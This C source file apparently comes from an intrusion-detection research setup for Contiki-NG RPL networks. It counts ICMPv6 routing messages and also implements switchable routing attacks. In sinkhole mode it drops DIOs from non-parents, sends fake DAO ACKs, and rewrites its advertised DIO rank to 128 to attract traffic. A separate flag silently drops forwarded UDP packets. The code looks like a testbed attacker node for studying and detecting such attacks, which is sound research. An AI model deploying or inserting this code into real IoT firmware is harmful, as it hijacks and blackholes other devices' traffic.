/*
 * Copyright (c) 2021, RISE Research Institutes of Sweden AB.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the copyright holder nor the names of its
 *    contributors may be used to endorse or promote products derived
 *    from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
 * FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
 * STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED
 * OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include "icmp6-stats.h"
#include "net/netstack.h"
#include "net/routing/routing.h"
#include "net/ipv6/uipbuf.h"
#include "net/ipv6/uip-ds6.h"
#include "net/ipv6/uip-icmp6.h"
#if ROUTING_CONF_RPL_LITE
#include "net/routing/rpl-lite/rpl.h"
#elif ROUTING_CONF_RPL_CLASSIC
#include "net/routing/rpl-classic/rpl.h"
#include "net/routing/rpl-classic/rpl-private.h"
#endif

#include "sys/log.h"
#define LOG_MODULE "ICMP6-IDS"
#define LOG_LEVEL LOG_LEVEL_INFO

#define ATTACK_DROP_DIO 1
#define ATTACK_FAKE_DAO 1

struct icmp6_stats icmp6_stats;
bool icmp6_stats_sink_hole = false;
bool icmp6_stats_drop_fwd_udp = false;
/*---------------------------------------------------------------------------*/
static bool
is_parent(const uip_ipaddr_t *addr, uint8_t instance_id, bool compare_mac)
{
#if ROUTING_CONF_RPL_LITE
  uip_ipaddr_t *parent;
  parent = rpl_neighbor_get_ipaddr(curr_instance.dag.preferred_parent);
  if(parent == NULL) {
    return false;
  }
  if(compare_mac) {
    return memcmp(&addr->u8[8], &parent->u8[8], 8) == 0;
  }
  return uip_ipaddr_cmp(addr, parent);
#elif ROUTING_CONF_RPL_CLASSIC
  rpl_instance_t *instance;
  rpl_parent_t *parent;

  instance = rpl_get_instance(instance_id);
  if(instance == NULL) {
    return false;
  }
  if(RPL_IS_STORING(instance)) {
    return rpl_find_parent(instance->current_dag, addr) != NULL;
  }
#error Not yet implemented!
#else /* Not RPL */
  return true;
#endif
}
/*---------------------------------------------------------------------------*/
static const char *
get_proto_as_string(uint8_t proto)
{
  static char buf[4];
  switch(proto) {
  case UIP_PROTO_ICMP:
    return "ICMP";
  case UIP_PROTO_TCP:
    return "TCP";
  case UIP_PROTO_UDP:
    return "UDP";
  case UIP_PROTO_ICMP6:
    return "ICMP6";
  default:
    snprintf(buf, sizeof(buf), "%u", proto);
    return buf;
  }
}
/*---------------------------------------------------------------------------*/
static enum netstack_ip_action
process_dis_input(struct uip_icmp_hdr *hdr)
{
  if(uip_is_addr_mcast(&UIP_IP_BUF->destipaddr)) {
    /* Multicast */
    icmp6_stats.dis_mc_recv++;
  } else {
    /* Unicast */
    icmp6_stats.dis_uc_recv++;
  }
  return NETSTACK_IP_PROCESS;
}
/*---------------------------------------------------------------------------*/
static enum netstack_ip_action
process_dio_input(struct uip_icmp_hdr *hdr)
{
  if(uip_is_addr_mcast(&UIP_IP_BUF->destipaddr)) {
    /* Multicast */
    icmp6_stats.dio_mc_recv++;
  } else {
    /* Unicast */
    icmp6_stats.dio_uc_recv++;
  }

#if ATTACK_DROP_DIO
  if(icmp6_stats_sink_hole) {
    uint8_t *payload = (uint8_t *)(hdr + 1);
    if(is_parent(&UIP_IP_BUF->srcipaddr, payload[0], false)) {
      LOG_INFO("allowing DIO from parent ");
      LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
      LOG_INFO_("\n");
    } else {
      LOG_INFO("dropping DIO from ");
      LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
      LOG_INFO_("\n");
      return NETSTACK_IP_DROP;
    }
  }
#endif /* ATTACK_DROP_DIO */

  return NETSTACK_IP_PROCESS;
}
/*---------------------------------------------------------------------------*/
static enum netstack_ip_action
process_dao_input(struct uip_icmp_hdr *hdr)
{
  icmp6_stats.dao_recv++;

#if ATTACK_FAKE_DAO
#if ROUTING_CONF_RPL_LITE
  if(icmp6_stats_sink_hole) {
    uint8_t *payload = (uint8_t *)(hdr + 1);
    if(is_parent(&UIP_IP_BUF->srcipaddr, payload[0], true)) {
      LOG_INFO("drop DAO from parent ");
      LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
      LOG_INFO_("\n");
    } else {
      uint8_t flags = payload[1];
      uint8_t sequence = payload[3];
      if(flags & RPL_DAO_K_FLAG) {
        /* Node requests a DAO ACK */
        LOG_INFO("sending fake DAO ACK to ");
        LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
        LOG_INFO_("\n");
        rpl_timers_schedule_dao_ack(&UIP_IP_BUF->srcipaddr, sequence);
      }
    }
    return NETSTACK_IP_DROP;
  }
#endif /* ROUTING_CONF_RPL_LITE */
#endif /* ATTACK_FAKE_DAO */

  return NETSTACK_IP_PROCESS;
}
/*---------------------------------------------------------------------------*/
static enum netstack_ip_action
process_dao_ack_input(struct uip_icmp_hdr *hdr)
{
  /* Count DAO ack? */
  return NETSTACK_IP_PROCESS;
}
/*---------------------------------------------------------------------------*/
static enum netstack_ip_action
ip_input(void)
{
  struct uip_icmp_hdr *icmp_hdr;
  uint8_t *header;
  uint8_t proto;
  enum netstack_ip_action action = NETSTACK_IP_PROCESS;

  header = uipbuf_get_last_header(uip_buf, uip_len, &proto);
  LOG_INFO("Incoming %s packet from ", get_proto_as_string(proto));
  LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
  LOG_INFO_("\n");
  if(proto == UIP_PROTO_ICMP6 && header != NULL) {
    icmp_hdr = (struct uip_icmp_hdr *)header;
    icmp6_stats.total_recv++;
    if(icmp_hdr->type == ICMP6_RPL) {
      icmp6_stats.rpl_total_recv++;
      switch(icmp_hdr->icode) {
      case RPL_CODE_DIS:
        action = process_dis_input(icmp_hdr);
        break;
      case RPL_CODE_DIO:
        action = process_dio_input(icmp_hdr);
        break;
      case RPL_CODE_DAO:
        action = process_dao_input(icmp_hdr);
        break;
      case RPL_CODE_DAO_ACK:
        action = process_dao_ack_input(icmp_hdr);
        break;
      }
    }
  }
  return action;
}
/*---------------------------------------------------------------------------*/
static void
process_dis_output(struct uip_icmp_hdr *hdr)
{
  if(uip_is_addr_mcast(&UIP_IP_BUF->destipaddr)) {
    /* Multicast */
    icmp6_stats.dis_mc_sent++;
  } else {
    /* Unicast */
    icmp6_stats.dis_uc_sent++;
  }
}
/*---------------------------------------------------------------------------*/
static void
process_dio_output(struct uip_icmp_hdr *hdr)
{
  uint8_t *payload;

  if(uip_is_addr_mcast(&UIP_IP_BUF->destipaddr)) {
    /* Multicast */
    icmp6_stats.dio_mc_sent++;
  } else {
    /* Unicast */
    icmp6_stats.dio_uc_sent++;
  }

  if(icmp6_stats_sink_hole) {
    uint16_t new_rank = 128;
    payload = (uint8_t *)(hdr + 1);
    LOG_INFO("sending fake DIO: i: %u ver: %u rank: %u => rank: %u\n",
             payload[0], payload[1],
             ((uint16_t)payload[2] << 8) + payload[3],
             new_rank);
    payload[2] = new_rank >> 8;
    payload[3] = new_rank & 0xff;

    /* Recalculate checksum */
    hdr->icmpchksum = 0;
    hdr->icmpchksum = ~uip_icmp6chksum();
  }
}
/*---------------------------------------------------------------------------*/
static void
process_dao_output(struct uip_icmp_hdr *hdr)
{
  icmp6_stats.dao_sent++;
}
/*---------------------------------------------------------------------------*/
static void
process_dao_ack_output(struct uip_icmp_hdr *hdr)
{
}
/*---------------------------------------------------------------------------*/
static enum netstack_ip_action
ip_output(const linkaddr_t *localdest)
{
  struct uip_icmp_hdr *icmp_hdr;
  uint8_t *header;
  bool is_from_me;
  uint8_t proto;

  header = uipbuf_get_last_header(uip_buf, uip_len, &proto);
  is_from_me = uip_ds6_is_my_addr(&UIP_IP_BUF->srcipaddr);
  LOG_INFO("%s %s packet to ", is_from_me ? "Outgoing" : "Forwarding",
           get_proto_as_string(proto));
  LOG_INFO_6ADDR(&UIP_IP_BUF->destipaddr);
  if(!is_from_me) {
    LOG_INFO_(" from ");
    LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
  }
  LOG_INFO_("\n");
  if(is_from_me && proto == UIP_PROTO_ICMP6 && header != NULL) {
    icmp_hdr = (struct uip_icmp_hdr *)header;
    icmp6_stats.total_sent++;
    if(icmp_hdr->type == ICMP6_RPL) {
      icmp6_stats.rpl_total_sent++;
      switch(icmp_hdr->icode) {
      case RPL_CODE_DIS:
        process_dis_output(icmp_hdr);
        break;
      case RPL_CODE_DIO:
        process_dio_output(icmp_hdr);
        break;
      case RPL_CODE_DAO:
        process_dao_output(icmp_hdr);
        break;
      case RPL_CODE_DAO_ACK:
        process_dao_ack_output(icmp_hdr);
        break;
      }
    }
  }

  if(!is_from_me && icmp6_stats_drop_fwd_udp && proto == UIP_PROTO_UDP) {
    LOG_INFO("Dropping UDP forwarded from ");
    LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
    LOG_INFO_("\n");
    return NETSTACK_IP_DROP;
  }

  return NETSTACK_IP_PROCESS;
}
/*---------------------------------------------------------------------------*/
static struct netstack_ip_packet_processor packet_processor = {
  .process_input = ip_input,
  .process_output = ip_output
};
/*---------------------------------------------------------------------------*/
void
icmp6_stats_init(void)
{
  /* Register packet processor */
  netstack_ip_packet_processor_add(&packet_processor);
}
/*---------------------------------------------------------------------------*/
